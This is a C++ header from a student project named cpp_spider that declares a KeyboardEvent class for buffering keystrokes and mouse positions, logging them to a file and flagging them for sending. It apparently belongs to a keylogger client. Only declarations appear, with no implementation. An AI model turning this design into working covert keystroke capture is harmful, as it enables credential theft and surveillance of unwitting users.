/*
** KeyboardEvent.hpp for cpp_spider in cpp_spider\Client\Headers
**
** Made by august_t
** Login   <august_t@epitech.net>
**
** Started on  Fri Sep 29 11:55:03 2017 august_t
** Last update Sun Oct 08 17:02:41 2017 fagnol_r
*/

#ifndef _KEYBOARDEVENT_HPP_
#define _KEYBOARDEVENT_HPP_

#include "IEvent.hpp"

class   KeyboardEvent : public IEvent
{
private:
  std::string   _keyBuffer;
  std::string   _mouseBuffer;
  int           _nbPress;
  std::fstream  _logs;
  char          _key;
  bool          _isMaj;
  bool          _isSend;
  boost::mutex  _mutex;
  POINT       _position;
  std::thread _t;
  bool        _sousa;
public:
  KeyboardEvent();
  ~KeyboardEvent();
  void          getKey();
  void          writeDataInFile();
  void          writeLog();
  std::string   getKeyboardBuffer();
  std::string   getMouseBuffer();
  void          writeMaj();
  void          writeAltGr();
  bool          getSend();
  void          setSend(bool);
  void          init();
  std::thread   &getThread();
  void          setSousa(bool);
  void          eraseKeyboardString();
  void          eraseMouseString();
};


#endif /* !_KEYBOARDEVENT_HPP_ */
